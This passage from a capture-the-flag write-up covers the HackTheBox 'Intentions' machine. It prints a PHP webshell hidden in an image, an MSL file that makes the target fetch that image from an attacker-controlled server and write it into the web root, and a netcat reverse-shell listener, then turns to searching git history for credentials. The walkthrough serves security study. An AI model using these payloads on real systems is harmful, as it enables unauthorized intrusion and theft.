+<span class="mf">10.10.11.220</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">[</span><span class="n">14/Oct/2023 09:57:46</span><span class="o">]</span><span class="w"> </span><span class="ss">"GET / HTTP/1.1"</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+It works as expected and initiates an HTTP request to my HTTP server. However, at this point, we are somewhat limited in terms of what we can do with this functionality.<br/><br/>
+<h3><br>Shell as www-data</br></h3><br>
+Every file we specify seems to trigger an effect, and knowing that they're using phpimagick, it's worth exploring potential vulnerabilities associated with this tool.<br/><br/>
+Following some research online, I came across an article on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b#rce-via-imagick-extension">HackTricks</a> discussing a potential method for achieving Remote Code Execution (RCE) by exploiting PHP Arbitrary Object Instantiations.<br/><br/>
+We can attempt to abuse this vulnerability by leveraging the <code>Vid Parser</code>, which allows us to write arbitrary content to an arbitrary path within the filesystem. This could be used to write a PHP webshell and potentially gain RCE.<br/><br/>
+For a more in-depth exploration of this exploitation, I recommend reading the article on <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">PT Security</a>.<br/><br/>
+To begin, we need to create an image containing a PHP web shell, as MSL only accepts images.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali$</span><span class="w"> </span><span class="nx">convert</span><span class="w"> </span><span class="nx">xc</span><span class="o">:</span><span class="nx">red</span><span class="w"> </span><span class="o">-</span><span class="nx">set</span><span class="w"> </span><span class="s1">'Copyright'</span><span class="w"> </span><span class="s1">'</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s1">'</span><span class="w"> </span><span class="nx">positive</span><span class="p">.</span><span class="nx">png</span>
+<span class="nx">elswixqkali$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Next, we will generate an MSL file that will facilitate the transfer of this image from our HTTP server to a web directory where we can make the necessary changes.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;image&gt;</span>
+<span class="nt">&lt;read</span><span class="w"> </span><span class="na">filename=</span><span class="s">"http://10.10.16.6/pwned.png"</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="nt">&lt;write</span><span class="w"> </span><span class="na">filename=</span><span class="s">"/var/www/intentions/public/pwned.php"</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/image&gt;</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+First, I need to have an HTTP server actively listening on port 80:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="n">server</span><span class="w"> </span><span class="mi">80</span>
+<span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="p">(</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span><span class="w"> </span><span class="p">...</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Let's proceed with the request, taking advantage of VID Parser and MSL:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/41.png"/><br/><br/>
+We should receive the following response:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/42.png"/><br/><br/>
+Great, we can now access our web shell at <code>/pwned.php</code>.:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/43.png"/><br/><br/>
+Finally, we've successfully achieved Remote Code Execution (RCE):<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/44.png"/><br/><br/>
+Now, we're going to initiate a reverse shell, so make sure you have <code>nc</code> (netcat) listening:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">3001</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">7.94</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span><span class="w"> </span><span class="p">)</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="mi">3001</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">3001</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Next, we'll send the reverse shell with URL encoding for the <code>&amp;</code> character:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/45.png"/><br/><br/>
+Finally, we have successfully gained access to the system:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">3001</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">7.94</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span><span class="w"> </span><span class="p">)</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="mi">3001</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">3001</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="k">Connection</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mf">10.10.11.220</span><span class="err">:</span><span class="mf">50784.</span>
+<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="p">(</span><span class="mi">1070</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
+<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="k">public</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="err">@</span><span class="nx">intentions</span><span class="p">:</span><span class="o">~/</span><span class="nx">html</span><span class="o">/</span><span class="nx">intentions</span><span class="o">/</span><span class="nx">public</span><span class="err">$</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span><span class="w"> </span><span class="o">-</span><span class="nx">c</span><span class="w"> </span><span class="nx">bash</span>
+<span class="nx">script</span><span class="w"> </span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span><span class="w"> </span><span class="o">-</span><span class="nx">c</span><span class="w"> </span><span class="nx">bash</span>
+<span class="nx">Script</span><span class="w"> </span><span class="nx">started</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">log</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="err">'</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span><span class="err">'</span><span class="p">.</span>
+<span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="err">@</span><span class="nx">intentions</span><span class="p">:</span><span class="o">~/</span><span class="nx">html</span><span class="o">/</span><span class="nx">intentions</span><span class="o">/</span><span class="nx">public</span><span class="err">$</span><span class="w"> </span><span class="o">^</span><span class="nx">Z</span>
+<span class="nx">zsh</span><span class="p">:</span><span class="w"> </span><span class="nx">suspended</span><span class="w">  </span><span class="nx">nc</span><span class="w"> </span><span class="o">-</span><span class="nx">lvnp</span><span class="w"> </span><span class="mi">3001</span>
+
+<span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">stty</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="o">-</span><span class="nx">echo</span><span class="p">;</span><span class="nx">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="nx">continued</span><span class="w">  </span><span class="nx">nc</span><span class="w"> </span><span class="o">-</span><span class="nx">lvnp</span><span class="w"> </span><span class="mi">3001</span>
+<span class="w">                               </span><span class="nx">reset</span>
+<span class="nx">reset</span><span class="p">:</span><span class="w"> </span><span class="nx">unknown</span><span class="w"> </span><span class="nx">terminal</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">unknown</span>
+<span class="nx">Terminal</span><span class="w"> </span><span class="k">type</span><span class="p">?</span><span class="w"> </span><span class="nx">xterm</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="o">$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="o">$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="o">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br>Shell as greg</br></h3><br>
+While exploring the web directories, I discovered the presence of a <code>.git</code> file, indicating that the web application is a Git repository:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="err">@</span><span class="nx">intentions</span><span class="p">:</span><span class="o">~/</span><span class="nx">html</span><span class="o">/</span><span class="nx">intentions</span><span class="err">$</span><span class="w">  </span><span class="nx">ls</span><span class="w"> </span><span class="o">-</span><span class="nx">la</span>
+<span class="nx">total</span><span class="w"> </span><span class="mi">820</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">  </span><span class="mi">14</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Feb</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="p">.</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">3</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Feb</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="p">..</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">1068</span><span class="w"> </span><span class="nx">Feb</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="p">.</span><span class="nx">env</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Feb</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="p">.</span><span class="nx">git</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">3958</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">README</span><span class="p">.</span><span class="nx">md</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">7</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">app</span>
+<span class="o">-</span><span class="nx">rwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">1686</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">artisan</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">3</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">bootstrap</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">1815</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">composer</span><span class="p">.</span><span class="nx">json</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">     </span><span class="mi">300400</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">composer</span><span class="p">.</span><span class="nx">lock</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">2</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">config</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">database</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">1629</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">docker</span><span class="o">-</span><span class="nx">compose</span><span class="p">.</span><span class="nx">yml</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w"> </span><span class="mi">534</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">      </span><span class="mi">20480</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">node_modules</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">     </span><span class="mi">420902</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="kn">package</span><span class="o">-</span><span class="nx">lock</span><span class="p">.</span><span class="nx">json</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">        </span><span class="mi">891</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="kn">package</span><span class="p">.</span><span class="nx">json</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">1139</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">phpunit</span><span class="p">.</span><span class="nx">xml</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="w"> </span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="w">   </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">14</span><span class="p">:</span><span class="mi">10</span><span class="w"> </span><span class="nx">public</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">7</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">resources</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">2</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Jun</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="w"> </span><span class="nx">routes</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">        </span><span class="mi">569</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">server</span><span class="p">.</span><span class="nx">php</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="w"> </span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="w">   </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">storage</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">   </span><span class="mi">4</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">12</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="nx">tests</span>
+<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span><span class="w">  </span><span class="mi">45</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">       </span><span class="mi">4096</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">vendor</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="nx">root</span><span class="w">     </span><span class="nx">root</span><span class="w">        </span><span class="mi">722</span><span class="w"> </span><span class="nx">Feb</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">webpack</span><span class="p">.</span><span class="nx">mix</span><span class="p">.</span><span class="nx">js</span>
+<span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="err">@</span><span class="nx">intentions</span><span class="p">:</span><span class="o">~/</span><span class="nx">html</span><span class="o">/</span><span class="nx">intentions</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+I've downloaded the Git repository to my local machine, and now I'll proceed to inspect the commits:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nf">log</span>
+<span class="k">commit</span><span class="w"> </span><span class="mi">1</span><span class="n">f29dfde45c21be67bb2452b46d091888ed049c3</span><span class="w"> </span><span class="p">(</span><span class="n">HEAD</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">master</span><span class="p">)</span>
+<span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">steve</span><span class="w"> </span><span class="o">&lt;</span><span class="n">steve</span><span class="nv">@intentions</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w">   </span><span class="n">Mon</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">29</span><span class="err">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
+
+<span class="w">    </span><span class="n">Fix</span><span class="w"> </span><span class="n">webpack</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">production</span>
+
+<span class="k">commit</span><span class="w"> </span><span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
+<span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">greg</span><span class="w"> </span><span class="o">&lt;</span><span class="n">greg</span><span class="nv">@intentions</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w">   </span><span class="n">Thu</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">21</span><span class="err">:</span><span class="mi">52</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
+
+<span class="w">    </span><span class="n">Test</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">steve</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="k">database</span><span class="p">,</span><span class="w"> </span><span class="n">switching</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">advice</span>
+
+<span class="k">commit</span><span class="w"> </span><span class="mi">36</span><span class="n">b4287cf2fb356d868e71dc1ac90fc8fa99d319</span>
+<span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">greg</span><span class="w"> </span><span class="o">&lt;</span><span class="n">greg</span><span class="nv">@intentions</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w">   </span><span class="n">Wed</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">45</span><span class="err">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
+
+<span class="w">    </span><span class="n">Adding</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">API</span><span class="err">!</span>
+
+<span class="k">commit</span><span class="w"> </span><span class="n">d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd</span>
+<span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">steve</span><span class="w"> </span><span class="o">&lt;</span><span class="n">steve</span><span class="nv">@intentions</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="nc">Date</span><span class="err">:</span><span class="w">   </span><span class="n">Fri</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">19</span><span class="err">:</span><span class="mi">32</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
+
+<span class="w">    </span><span class="n">Initial</span><span class="w"> </span><span class="n">v2</span><span class="w"> </span><span class="k">commit</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Upon careful inspection of each commit, I stumbled upon some credentials within one of them:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">kali</span><span class="o">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
+<span class="n">commit</span><span class="w"> </span><span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
